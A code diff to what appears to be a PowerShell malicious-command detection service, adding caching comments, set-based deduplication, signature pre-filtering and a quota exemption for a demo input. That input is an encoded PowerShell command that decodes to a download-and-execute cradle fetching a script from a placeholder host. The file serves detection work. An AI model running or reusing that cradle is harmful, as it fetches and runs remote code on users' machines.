@@ -12,6 +12,9 @@ from config.settings import CACHE_DURATION
 from services.detectors.obfuscation_detector import deobfuscate
 from services.detectors.encoded_command_detector import detect_encoded_command
 from services.detectors.double_encoded_detector import detect_double_encoded_command
+
+# ✅ Example command that doesn't count towards quota
+EXAMPLE_ENCODED_COMMAND = 'powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAYQBkAC4AcwBpAHQAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA'
 import Levenshtein
 
 
@@ -49,13 +52,15 @@ def generate_short_id(length: int = 8) -> str:
 
 
 async def load_signatures_from_db(user_id: str = None) -> list:
-    
+    """Load signatures with optimized caching"""
     global signatures_cache, cache_timestamp
     
     try:
         now = int(time.time() * 1000)
         
-       
+        # ✅ OPTIMIZATION: Skip premium check if cache is valid
+        cache_key = "signatures_free"  # Default
+        
         is_premium_user = False
         if user_id:
             supabase = get_supabase_client()
@@ -63,9 +68,10 @@ async def load_signatures_from_db(user_id: str = None) -> list:
             if profile_response.data:
                 is_premium_user = profile_response.data.get('is_premium_user', False)
         
-       
+        # ✅ Update cache key after premium check
         cache_key = f"signatures_{'premium' if is_premium_user else 'free'}"
         
+        # ✅ OPTIMIZATION: Return cached signatures immediately
         if signatures_cache and cache_timestamp and cache_key in signatures_cache and (now - cache_timestamp) < CACHE_DURATION:
             return signatures_cache[cache_key]
         
@@ -450,27 +456,34 @@ def analyze_command_patterns(command: str, signatures: list) -> dict:
     
     commands_to_analyze = [original_command]
     
+    # ✅ OPTIMIZATION: Use set for O(1) lookup instead of list.contains
+    commands_set = {original_command}
+    
     # Add base64 decoded command from deobfuscate_powershell
     if decode_iterations >= 1 and deobfuscated_command and deobfuscated_command != command:
-        commands_to_analyze.append(deobfuscated_command)
+        commands_set.add(deobfuscated_command)
     
     # Add decoded_command from detect_encoded_command (may be different/more complete)
-    if decoded_command and decoded_command != command and decoded_command not in commands_to_analyze:
-        commands_to_analyze.append(decoded_command)
+    if decoded_command and decoded_command != command:
+        commands_set.add(decoded_command)
     
     # Add custom deobfuscated (format strings, etc)
-    if custom_deobfuscated != command and custom_deobfuscated not in commands_to_analyze:
-        commands_to_analyze.append(custom_deobfuscated)
+    if custom_deobfuscated != command:
+        commands_set.add(custom_deobfuscated)
     
     # Add double decoded if available
-    if double_decoded_command and double_decoded_command not in commands_to_analyze:
-        commands_to_analyze.append(double_decoded_command)
-        
+    if double_decoded_command:
+        commands_set.add(double_decoded_command)
+    
+    commands_to_analyze = list(commands_set)
+    
+    # ✅ OPTIMIZATION: Pre-filter signatures to skip
+    skip_signatures = {"Obfuscation Detected", "Encoded Command Detected", "Double Encoded Command Detected"}
+    if has_encoded_command_indicator:
+        skip_signatures.add("Long base64 strings")
+    
     for signature in signatures:
-        if signature.get("name") in ["Obfuscation Detected", "Encoded Command Detected", "Double Encoded Command Detected"]:
-            continue
-        
-        if signature.get("name") == "Long base64 strings" and has_encoded_command_indicator:
+        if signature.get("name") in skip_signatures:
             continue
         
         all_signature_matches = []
@@ -613,9 +626,13 @@ async def save_analysis_to_db(
         decoded_cmd = analysis_result.get("decoded_command")
         double_decoded_cmd = analysis_result.get("double_decoded_command")
         
+        # ✅ Check if this is the example command
+        is_example_command = command.strip() == EXAMPLE_ENCODED_COMMAND.strip()
+        
         # ✅ NEW: Determine if analysis has actual decoded content
+        # Example command doesn't count towards quota
         has_decoded_content = bool(
-            decoded_cmd or double_decoded_cmd or deobfuscated_cmd
+            (decoded_cmd or double_decoded_cmd or deobfuscated_cmd) and not is_example_command
         )
         
         
